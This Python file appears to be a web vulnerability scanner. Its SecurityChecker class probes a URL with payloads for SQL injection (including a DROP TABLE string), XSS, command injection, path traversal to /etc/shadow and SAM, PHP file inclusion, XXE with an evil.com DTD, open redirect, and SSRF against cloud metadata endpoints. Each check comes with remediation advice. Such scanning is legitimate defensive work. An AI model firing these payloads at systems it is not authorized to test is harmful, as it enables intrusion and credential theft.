import requests
from bs4 import BeautifulSoup
from datetime import datetime
import re
import logging
from urllib.parse import urljoin
import requests

logger = logging.getLogger(__name__)

class SecurityChecker:
    def check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            '../../../etc/passwd',
            '..\..\Windows\system.ini',
            '....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
            '../../../../../../../../etc/passwd',
            '..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
            '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
            '/etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            '../../../etc/passwd\0.jpg',
            './../../../../../../../../../../etc/passwd',
            '../../../../../../../../windows/win.ini;.jpg',
            '/var/www/../../etc/passwd',
            '/var/www/html/../../etc/passwd'
        ]
        
        sensitive_files = {
            'unix': [
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/etc/apache2/apache2.conf',
                '/proc/self/environ',
                '/var/log/apache2/access.log',
                '/var/log/apache2/error.log',
                '/.env',
                '/.git/config'
            ],
            'windows': [
                'Windows/system.ini',
                'Windows/win.ini',
                'Windows/repair/sam',
                'Windows/repair/system',
                'Windows/repair/software',
                'Windows/repair/security',
                'Windows/debug/NetSetup.log',
                'Windows/iis6.log',
                'Windows/system32/config/AppEvent.Evt'
            ]
        }
        
        results = {
            'name': 'Directory Traversal',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True,
            'vulnerabilities_found': []
        }

        try:
            # Test basic directory traversal
            base_url = url.rstrip('/')
            
            # Function to check response for sensitive data
            def check_sensitive_content(response_text):
                sensitive_patterns = [
                    r'root:.*:0:0:',  # Unix passwd file
                    r'mysql_connect\(',  # PHP database connection
                    r'DOCUMENT_ROOT',  # Server configuration
                    r'\[boot loader\]',  # Windows system files
                    r'PDO\(',  # Database connections
                    r'SMTP_HOST',  # Email configuration
                    r'DB_PASSWORD',  # Database credentials
                    r'API_KEY',  # API credentials
                ]
                return any(re.search(pattern, response_text) for pattern in sensitive_patterns)

            # Test each payload
            for payload in payloads:
                for param in ['path', 'file', 'dir', 'folder', 'include', 'page']:
                    test_url = f"{base_url}?{param}={payload}"
                    try:
                        response = requests.get(
                            test_url, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        
                        # Check for successful directory traversal
                        if response.status_code == 200:
                            if check_sensitive_content(response.text):
                                results['status'] = 'vulnerable'
                                results['details'].append({
                                    'payload': payload,
                                    'parameter': param,
                                    'url': test_url,
                                    'status_code': response.status_code
                                })
                                results['passed'] = False
                                results['risk_level'] = 'Critical'
                                
                                # Add to vulnerabilities found
                                if payload not in results['vulnerabilities_found']:
                                    results['vulnerabilities_found'].append(payload)
                    
                    except requests.exceptions.RequestException:
                        continue

            # Test for sensitive file access
            for system, files in sensitive_files.items():
                for file in files:
                    for prefix in ['', '../', '....//']:
                        test_path = prefix + file
                        test_url = f"{base_url}?file={test_path}"
                        
                        try:
                            response = requests.get(
                                test_url,
                                headers=self.headers,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                            
                            if response.status_code == 200 and check_sensitive_content(response.text):
                                results['status'] = 'vulnerable'
                                results['details'].append({
                                    'payload': test_path,
                                    'file_type': system,
                                    'url': test_url,
                                    'status_code': response.status_code
                                })
                                results['passed'] = False
                                results['risk_level'] = 'Critical'
                                
                                if test_path not in results['vulnerabilities_found']:
                                    results['vulnerabilities_found'].append(test_path)
                                    
                        except requests.exceptions.RequestException:
                            continue

            # Add recommendations if vulnerabilities found
            if not results['passed']:
                results['recommendations'].extend([
                    "Implement proper input validation and sanitization",
                    "Use whitelisting for file paths",
                    "Implement proper access controls and file permissions",
                    "Use secure file handling functions",
                    "Avoid passing user input directly to file operations",
                    "Implement proper error handling to avoid information disclosure",
                    "Use chroot jail where applicable",
                    "Implement file access logging and monitoring",
                    "Use web application firewall (WAF) rules to detect path traversal attempts",
                    "Sanitize file paths before use"
                ])

                # Add specific details about findings
                results['scan_summary'] = {
                    'total_payloads_tested': len(payloads),
                    'successful_traversals': len(results['vulnerabilities_found']),
                    'vulnerable_parameters': list(set(d.get('parameter', '') for d in results['details'])),
                    'affected_files': list(set(d.get('payload', '') for d in results['details']))
                }

        except Exception as e:
            results['details'].append(f"Error during directory traversal check: {str(e)}")
            results['error'] = str(e)

        return results

    def _extract_path_from_url(self, url):
        """Helper method to extract path from URL"""
        try:
            parsed = urllib.parse.urlparse(url)
            return parsed.path
        except:
            return ''

    def _is_file_readable(self, response):
        """Helper method to check if file content is readable"""
        try:
            return (
                response.status_code == 200 and
                len(response.text) > 0 and
                not response.text.lower().startswith('<!doctype html>')
            )
        except:
            return False
    def __init__(self):
        self.headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
        }
        self.timeout = 5
        self.attack_vectors = {
        'XSS': self.check_xss_vulnerability,
        'SQL_Injection': self.check_sql_injection,
        'CSRF': self.check_csrf_vulnerability,
        'Command_Injection': self.check_command_injection,
        'Directory_Traversal': self.check_directory_traversal,
        'File_Inclusion': self.check_file_inclusion,
        'Open_Redirect': self.check_open_redirect,
        'SSRF': self.check_ssrf,
        'XXE': self.check_xxe_vulnerability,
        'Clickjacking': self.check_clickjacking,
        'Information_Disclosure': self.check_information_disclosure
    }

    def check_xss_vulnerability(self, url):
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '\'><img src=x onerror=alert(1)>',
            'javascript:alert(1)//',
            '"><svg/onload=alert(1)>'
        ]
        
        results = {
            'name': 'Cross-Site Scripting (XSS)',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            # Test URL parameters
            params = {'q': '', 'search': '', 'id': ''}
            for param, _ in params.items():
                for payload in payloads:
                    test_url = f"{url}?{param}={payload}"
                    response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                    if payload in response.text:
                        results['status'] = 'vulnerable'
                        results['details'].append(f"XSS payload reflected in parameter: {param}")
                        results['risk_level'] = 'High'
                        results['passed'] = False
                        results['recommendations'].extend([
                            "Implement input validation",
                            "Use output encoding",
                            "Implement Content Security Policy (CSP)",
                            "Use HttpOnly and Secure cookie flags",
                            "Sanitize user inputs using appropriate libraries"
                        ])

            # Test form inputs
            response = requests.get(url, headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                inputs = form.find_all('input')
                for input_field in inputs:
                    if input_field.get('type') in ['text', 'search', 'url', 'tel', 'email']:
                        results['details'].append(
                            f"Potentially vulnerable input field found: {input_field.get('name')}"
                        )

        except Exception as e:
            results['details'].append(f"Error during XSS check: {str(e)}")

        return results

    def check_sql_injection(self, url):
        payloads = [
            "'",
            "1' OR '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin' --",
            "' OR 1=1--",
            "')) OR 1=1--",
            "1' AND SLEEP(5)--",  # Time-based
            "1' WAITFOR DELAY '0:0:5'--",  # SQL Server time-based
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"  # MySQL time-based
        ]
        
        results = {
            'name': 'SQL Injection',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            base_response_time = self.get_base_response_time(url)

            for payload in payloads:
                test_url = f"{url}?id={payload}"
                start_time = datetime.now()
                response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                response_time = (datetime.now() - start_time).total_seconds()

                # Check for SQL error messages
                sql_errors = [
                    'sql syntax',
                    'mysql_fetch_array',
                    'mysqli_fetch_array',
                    'ORA-01756',
                    'SQLServer JDBC Driver',
                    'PostgreSQL',
                    'mysql_num_rows',
                    'Error Occurred While Processing Request',
                    'Server Error in'
                ]
                
                # Check for error-based SQLi
                if any(error.lower() in response.text.lower() for error in sql_errors):
                    results['status'] = 'vulnerable'
                    results['details'].append(f"SQL error detected with payload: {payload}")
                    results['risk_level'] = 'Critical'
                    results['passed'] = False

                # Check for time-based SQLi
                if response_time > base_response_time + 4:  # Threshold for time-based detection
                    results['status'] = 'vulnerable'
                    results['details'].append(f"Potential time-based SQL injection detected with payload: {payload}")
                    results['risk_level'] = 'Critical'
                    results['passed'] = False

                if not results['passed']:
                    results['recommendations'].extend([
                        "Use parameterized queries",
                        "Implement input validation",
                        "Use ORM with prepared statements",
                        "Limit database user privileges",
                        "Use WAF rules to block SQL injection attempts",
                        "Implement proper error handling"
                    ])

        except Exception as e:
            results['details'].append(f"Error during SQL injection check: {str(e)}")

        return results

    def check_csrf_vulnerability(self, url):
        results = {
            'name': 'Cross-Site Request Forgery (CSRF)',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            response = requests.get(url, headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                # Check for CSRF tokens
                csrf_tokens = form.find_all(attrs={'name': re.compile(r'csrf|token', re.I)})
                
                # Check for secure token attributes
                if not csrf_tokens:
                    results['status'] = 'vulnerable'
                    results['details'].append(f"Form found without CSRF token: {form.get('action', 'unknown')}")
                    results['risk_level'] = 'High'
                    results['passed'] = False
                else:
                    # Verify token strength
                    for token in csrf_tokens:
                        token_value = token.get('value', '')
                        if len(token_value) < 32:  # Check for token length
                            results['details'].append("CSRF token might be too weak (length < 32 characters)")

                # Check for SameSite cookie attribute
                if 'Set-Cookie' in response.headers:
                    if 'SameSite' not in response.headers['Set-Cookie']:
                        results['details'].append("SameSite cookie attribute not set")
                        results['recommendations'].append("Set SameSite=Strict for cookies")

                if not results['passed']:
                    results['recommendations'].extend([
                        "Implement CSRF tokens in all forms",
                        "Use SameSite cookie attribute",
                        "Implement proper session management",
                        "Use double submit cookie pattern",
                        "Add CSRF protection middleware"
                    ])

        except Exception as e:
            results['details'].append(f"Error during CSRF check: {str(e)}")

        return results

    def check_clickjacking(self, url):
        results = {
            'name': 'Clickjacking',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            response = requests.get(url, headers=self.headers)
            headers = response.headers

            # Check X-Frame-Options header
            if 'X-Frame-Options' not in headers:
                results['status'] = 'vulnerable'
                results['details'].append("X-Frame-Options header is missing")
                results['passed'] = False
            else:
                xfo_value = headers['X-Frame-Options'].upper()
                if xfo_value not in ['DENY', 'SAMEORIGIN']:
                    results['status'] = 'vulnerable'
                    results['details'].append(f"Weak X-Frame-Options value: {xfo_value}")
                    results['passed'] = False

            # Check CSP frame-ancestors
            if 'Content-Security-Policy' in headers:
                csp = headers['Content-Security-Policy']
                if 'frame-ancestors' not in csp:
                    results['details'].append("CSP frame-ancestors directive not set")
            else:
                results['details'].append("Content-Security-Policy header is missing")

            if not results['passed']:
                results['risk_level'] = 'Medium'
                results['recommendations'].extend([
                    "Set X-Frame-Options to DENY or SAMEORIGIN",
                    "Implement frame-ancestors directive in CSP",
                    "Use proper framing controls"
                ])

        except Exception as e:
            results['details'].append(f"Error during clickjacking check: {str(e)}")

        return results

    def check_information_disclosure(self, url):
        sensitive_files = [
            'robots.txt',
            '.git/config',
            '.env',
            'phpinfo.php',
            '.htaccess',
            'web.config',
            'backup.zip',
            'backup.sql',
            'readme.md',
            'changelog.txt'
        ]

        results = {
            'name': 'Information Disclosure',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            for file in sensitive_files:
                test_url = urljoin(url, file)
                response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                
                if response.status_code == 200:
                    results['status'] = 'vulnerable'
                    results['details'].append(f"Sensitive file exposed: {file}")
                    results['passed'] = False

            # Check for server version disclosure
            response = requests.get(url, headers=self.headers)
            if 'Server' in response.headers:
                server = response.headers['Server']
                if any(char.isdigit() for char in server):
                    results['details'].append(f"Server version disclosed: {server}")
                    results['passed'] = False

            # Check for error messages
            error_test_urls = [
                f"{url}/'",
                f"{url}/invalid_page_123",
                f"{url}/?error=1"
            ]

            for test_url in error_test_urls:
                response = requests.get(test_url, headers=self.headers)
                if any(error in response.text.lower() for error in ['stack trace', 'error in', 'syntax error']):
                    results['details'].append("Detailed error messages exposed")
                    results['passed'] = False
                    break

            if not results['passed']:
                results['risk_level'] = 'Medium'
                results['recommendations'].extend([
                    "Remove sensitive files from web root",
                    "Configure proper error handling",
                    "Hide server version information",
                    "Implement proper access controls",
                    "Use custom error pages"
                ])

        except Exception as e:
            results['details'].append(f"Error during information disclosure check: {str(e)}")

        return results

    def get_base_response_time(self, url):
        """Get baseline response time for time-based checks"""
        try:
            start_time = datetime.now()
            requests.get(url, headers=self.headers, timeout=self.timeout)
            return (datetime.now() - start_time).total_seconds()
        except:
            return 0
    
    def check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            '| ls',
            '; ls',
            '`ls`',
            '$(ls)',
            '| ping -c 1 127.0.0.1',
            '; ping -c 1 127.0.0.1',
            '& whoami',
            '&& whoami',
            '| whoami',
            '; whoami',
            '`whoami`',
            '$(whoami)'
        ]
        
        results = {
            'name': 'Command Injection',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            base_response_time = self.get_base_response_time(url)
            
            for payload in payloads:
                test_url = f"{url}?cmd={payload}"
                start_time = datetime.now()
                response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                response_time = (datetime.now() - start_time).total_seconds()

                # Check for command execution indicators
                command_outputs = [
                    'root:', 'bin/', 'usr/', 'etc/',
                    'Directory of', 'Volume Serial Number',
                    'ttl=', 'bytes from', 'icmp_seq=',
                    'uid=', 'gid=', 'groups='
                ]
                
                if any(indicator in response.text for indicator in command_outputs):
                    results['status'] = 'vulnerable'
                    results['details'].append(f"Potential command injection with: {payload}")
                    results['risk_level'] = 'Critical'
                    results['passed'] = False

                # Check for time-based indicators
                if 'ping' in payload and response_time > base_response_time + 1:
                    results['status'] = 'vulnerable'
                    results['details'].append(f"Time-based command injection detected with: {payload}")
                    results['risk_level'] = 'Critical'
                    results['passed'] = False

            if not results['passed']:
                results['recommendations'].extend([
                    "Use input validation and sanitization",
                    "Avoid using shell commands",
                    "Implement proper input escaping",
                    "Use secure APIs instead of system commands",
                    "Implement command whitelisting",
                    "Use proper access controls"
                ])

        except Exception as e:
            results['details'].append(f"Error during command injection check: {str(e)}")

        return results

    def check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            '/etc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            '../../etc/passwd',
            '..\..\Windows\win.ini',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
            'expect://id'
        ]
        
        results = {
            'name': 'File Inclusion',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            for payload in payloads:
                test_url = f"{url}?file={payload}"
                response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                
                # Check for file content indicators
                file_content_indicators = [
                    'root:', 'bin/', 'usr/',
                    '[boot loader]', '[fonts]',
                    'php version', 'php info',
                    'uid=', 'gid=', 'groups='
                ]
                
                if any(indicator.lower() in response.text.lower() for indicator in file_content_indicators):
                    results['status'] = 'vulnerable'
                    results['details'].append(f"Potential file inclusion with: {payload}")
                    results['risk_level'] = 'Critical'
                    results['passed'] = False

            if not results['passed']:
                results['recommendations'].extend([
                    "Implement proper input validation",
                    "Use whitelisting for file paths",
                    "Disable allow_url_include if using PHP",
                    "Implement proper access controls",
                    "Use secure file handling functions"
                ])

        except Exception as e:
            results['details'].append(f"Error during file inclusion check: {str(e)}")

        return results

    def check_open_redirect(self, url):
        """Check for open redirect vulnerabilities"""
        payloads = [
            'https://evil.com',
            '//evil.com',
            '////evil.com',
            'https:evil.com',
            '\\\\evil.com',
            'javascript:alert(document.domain)',
            'data:text/html,<script>window.location="https://evil.com"</script>'
        ]
        
        results = {
            'name': 'Open Redirect',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            for payload in payloads:
                test_url = f"{url}?redirect={payload}&url={payload}&next={payload}"
                response = requests.get(test_url, headers=self.headers, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if payload in location or 'evil.com' in location:
                        results['status'] = 'vulnerable'
                        results['details'].append(f"Open redirect detected with: {payload}")
                        results['risk_level'] = 'Medium'
                        results['passed'] = False

            if not results['passed']:
                results['recommendations'].extend([
                    "Implement proper URL validation",
                    "Use whitelist of allowed redirect URLs",
                    "Implement URL signing for redirects",
                    "Use relative URLs when possible",
                    "Validate URL pattern before redirect"
                ])

        except Exception as e:
            results['details'].append(f"Error during open redirect check: {str(e)}")

        return results

    def check_ssrf(self, url):
        """Check for Server-Side Request Forgery vulnerabilities"""
        payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://[::1]',
            'http://169.254.169.254',  # AWS metadata
            'http://metadata.google.internal',  # GCP metadata
            'http://169.254.169.254/latest/meta-data/',
            'https://metadata.google.internal/computeMetadata/v1/',
            'http://127.0.0.1:22',
            'http://127.0.0.1:3306',
            'file:///etc/passwd'
        ]
        
        results = {
            'name': 'Server-Side Request Forgery',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            for payload in payloads:
                test_url = f"{url}?url={payload}&src={payload}&dest={payload}"
                response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                
                # Check for SSRF indicators
                ssrf_indicators = [
                    'ami-id', 'instance-id',  # AWS metadata
                    'computeMetadata', # GCP metadata
                    'root:', 'mysql',
                    'ssh-rsa', 'ssh-dss'
                ]
                
                if any(indicator in response.text for indicator in ssrf_indicators):
                    results['status'] = 'vulnerable'
                    results['details'].append(f"Potential SSRF with: {payload}")
                    results['risk_level'] = 'High'
                    results['passed'] = False

            if not results['passed']:
                results['recommendations'].extend([
                    "Implement proper URL validation",
                    "Use URL whitelisting",
                    "Block requests to internal IP addresses",
                    "Disable URL schema handlers",
                    "Implement network segmentation",
                    "Use URL signing for internal requests"
                ])

        except Exception as e:
            results['details'].append(f"Error during SSRF check: {str(e)}")

        return results

    def check_xxe_vulnerability(self, url):
        """Check for XML External Entity vulnerabilities"""
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><data>&send;</data>'
        ]
        
        results = {
            'name': 'XML External Entity (XXE)',
            'status': 'safe',
            'details': [],
            'recommendations': [],
            'risk_level': 'Low',
            'passed': True
        }

        try:
            headers = {**self.headers, 'Content-Type': 'application/xml'}
            
            for payload in xxe_payloads:
                response = requests.post(url, data=payload, headers=headers, timeout=self.timeout)
                
                # Check for XXE indicators
                xxe_indicators = [
                    'root:', 'bin/',  # Unix file content
                    '[boot loader]', '[fonts]',  # Windows file content
                    'uid=', 'gid=',
                    'xml parsing error'
                ]
                
                if any(indicator in response.text.lower() for indicator in xxe_indicators):
                    results['status'] = 'vulnerable'
                    results['details'].append("XXE vulnerability detected")
                    results['risk_level'] = 'Critical'
                    results['passed'] = False

            if not results['passed']:
                results['recommendations'].extend([
                    "Disable XML external entity processing",
                    "Use secure XML parsers",
                    "Implement XML validation",
                    "Use XML schema validation",
                    "Implement proper input validation"
                ])

        except Exception as e:
            results['details'].append(f"Error during XXE check: {str(e)}")

        return results

    def perform_comprehensive_scan(self, url):
        """Perform all security checks"""
        results = {
            'url': url,
            'scan_time': datetime.now().isoformat(),
            'attack_vectors': {},
            'overall_risk': {
                'score': 0,
                'level': 'Low',
                'passed_checks': 0,
                'total_checks': len(self.attack_vectors),
                'critical_vulnerabilities': 0,
                'high_vulnerabilities': 0,
                'medium_vulnerabilities': 0,
                'low_vulnerabilities': 0
            },
            'summary': {
                'total_vulnerabilities': 0,
                'passed_tests': 0,
                'failed_tests': 0
            }
        }

        for attack_name, check_function in self.attack_vectors.items():
            logger.info(f"Checking for {attack_name} vulnerabilities")
            check_result = check_function(url)
            results['attack_vectors'][attack_name] = check_result
            
            if not check_result['passed']:
                results['summary']['failed_tests'] += 1
                if check_result['risk_level'] == 'Critical':
                    results['overall_risk']['critical_vulnerabilities'] += 1
                elif check_result['risk_level'] == 'High':
                    results['overall_risk']['high_vulnerabilities'] += 1
                elif check_result['risk_level'] == 'Medium':
                    results['overall_risk']['medium_vulnerabilities'] += 1
                else:
                    results['overall_risk']['low_vulnerabilities'] += 1
            else:
                results['overall_risk']['passed_checks'] += 1
                results['summary']['passed_tests'] += 1

        # Calculate overall risk score
        total_weight = (
            results['overall_risk']['critical_vulnerabilities'] * 10 +
            results['overall_risk']['high_vulnerabilities'] * 7 +
            results['overall_risk']['medium_vulnerabilities'] * 4 +
            results['overall_risk']['low_vulnerabilities'] * 1
        )
        
        max_possible_weight = results['overall_risk']['total_checks'] * 10
        risk_score = (total_weight / max_possible_weight) * 100 if max_possible_weight > 0 else 0
        
        results['overall_risk']['score'] = round(risk_score, 2)
        results['overall_risk']['level'] = (
            'Critical' if risk_score >= 80 else
            'High' if risk_score >= 60 else
            'Medium' if risk_score >= 40 else
            'Low'
        )

        results['summary']['total_vulnerabilities'] = sum([
            results['overall_risk']['critical_vulnerabilities'],
            results['overall_risk']['high_vulnerabilities'],
            results['overall_risk']['medium_vulnerabilities'],
            results['overall_risk']['low_vulnerabilities']
        ])

        return results